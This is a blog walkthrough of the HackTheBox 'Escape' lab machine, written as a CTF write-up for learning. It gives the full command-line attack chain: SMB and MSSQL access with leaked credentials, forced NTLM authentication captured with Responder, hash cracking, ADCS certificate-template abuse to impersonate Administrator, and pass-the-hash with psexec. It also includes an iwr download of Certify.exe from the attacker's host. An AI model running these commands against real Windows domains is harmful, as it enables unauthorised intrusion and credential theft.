# :game_die: Escape Htb Walkthrough Fd33388E8C86

---

Hello Everyone, I am Dharani Sanjaiy from India. In this blog we will see the walkthrough of a retired medium rated [Hackthebox](https://app.hackthebox.com/home) machine.

Lets Get Started!

My methodology is I use[rustscan](https://github.com/RustScan/RustScan) first to find open ports and then use Nmap to do further enumeration like service scan etc.

```
rustscan -a <ip> --ulimit 5000
```

```
nmap -sC -sV p80,135,139,389,445,464,593 <ip> -o nmap/nmap-result.txt
```

We can see that the ports 139,445 are open so let’s enumerate smb first.

```
smbclient -L 10.129.25.162 -N
```

There’s a share named Public which we can access .

```
smbclient //<ip>/Public
```

After successful login and listing the directories, we found a pdf file.

Download the file to our local machine using “get <filename>” cmd.

Once you downloaded the pdf file, we will see a notice about some management stuffs. If you scroll down , there you’ll see credentials in the bonus section.

Its mentioning “SQL Server Authentication” so lets connect to MSSQL.

Before moving to that, we can look for some potential users in the active directory domain using impacket. The Impacket script can be found [here](https://github.com/fortra/impacket)

```
impacket-lookupsid sequel.htb/anonymous@<ip> -no-pass
```

It will gives us some users. I used anonymous as username here because while enumerating smb we noticed that we can use anonymous to list the shares.

Going back to the mssqsl, I used Impacket for connecting to mssql. You can also use tools like [sqsh](https://github.com/vonloxley/sqsh) to connect.

```
impacket-mssqlclient sequel.htb/usernamer:password@<ip>
```

The first thing that striked my mind when I got access is, we can do LLMNR poisoning to grab NTLM hashes of the user that the SQL sever is running as.

```
responder -I <interface name>
```

I used the command “EXEC xp_dirtree ‘\\<ip>\share’” on the sql server to make a connection request to my machine and started the responder on other pane.

And we got the NTLM hash of sql_svc account. Let’s crack the NTLM hash using John or hashcat depending on you choice. I stored the NTLM hash in a file named “hash”.

```
john hash --wordlist=rockyou.txt
```

After cracking, we got the password of sql_svc account.

I used evil-winrm to get the shell.

```
evil-winrm -i <ip> -u <username> -p <password>
```

While enumerating the C:/ drive, a directory called SQL Server stands out.

## Get WaterBucket’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

We can see a backup file called “ERRORLOG.BAK”.

The log file has failed login attempts of sqlserver. Reading the file shows us some weird usernames.

We knew that there’s a user called ‘Ryan.Cooper’ exist on the machine and the weird name has special characters in it. So, I tried that weird name as password for user Ryan. And to my surprise it worked!!!

```
evil-winrm -i <ip> -u Ryan.Cooper -p <weird name>
```

We got the shell and the user.txt file.

For privilege escalation, I tried using Bloodhound, Winpeas etc., but nothing seems interesting to exploit. After some research I found that we can privesc via Active Directory Certificate Services. You can read the whitepaper of abusing ADCS by SpecterOps [here](https://posts.specterops.io/certified-pre-owned-d95910965cd2).

I used [Certify](https://github.com/GhostPack/Certify) which comes with the [Ghost-Pack](https://github.com/GhostPack) to enumerate vulnerable certificates .

I transferred the certify.exe to the remote machine.

```
iwr http://<ip>/Certify.exe -outfile certify.exe
```

Run the following command to find the vulnerable Certificate template that you can take advantage of.

```
./certify.exe find /vulnerable
```

Things to note here are:

- Template Name: We have “UserAuthentication” template here which can be used to authenticate a user via Kerberos or LDAP.

- Enrollment Permissions: Its mentioned that Domain Users of this domain can enroll a certificate. As our user Ryan is a part of the domain user, we can use his account.

- msPKI-Certificate-Name-Flag: It mentioned “ENROLLEE SUPPLIES SUBJECT” which means we can supply the subject to the certificate template. In this case we are going to add the subject “altname” which refers to alternative name [We are going to use Administrator as the altname and then grab the certificate on behalf of Administrator which we’ll use to authenticate as Admin later.]

Let’s grab the certificate.

```
./certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator
```

And we got the certificate.

We will use the following openssl command to export the certificate in .pfx format.

```
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

```
--> where cert.pem is the certificate that we got using certify.
```

Now, we will use a tool called [certipy](https://github.com/ly4k/Certipy) to authenticate to the domain and get a TGT. We can get Administrator’s hash with the help of TGT.

```
certipy auth -pfx cert.pfx -dc-ip <ip> -username Administrator -domain sequel.htb
```

If you got any errors like above, use the command “ntpdate <ip>” to fix it.

You can install the ntpdate using “apt-get install ntpdate”

Running the ntpdate command few times until it says no skew, we are good to go now. Use the certipy command again and retrieve the admin hash.

We got the NT hash of Administrator. We can crack it or simply we can use “Pass-the-hash” attack to login as admin. I used psexec tool to login, you can use evil-winrm as well.

```
impacket-psexec sequel.htb/Administrator@10.129.25.162 -hashes <hash>
```

We are now NT-Authority/System now. Go and get the root.txt file.

Ok, we PWNED!! the Escape machine from HackTheBox. Follow me on medium , [HackTheBox](https://app.hackthebox.com/profile/1210955) and connect with me on [LinkedIn](https://www.linkedin.com/in/dharani-sanjaiy-/).

Support me : [https://www.buymeacoffee.com/DharaniSanjaiy](https://www.buymeacoffee.com/DharaniSanjaiy)

---
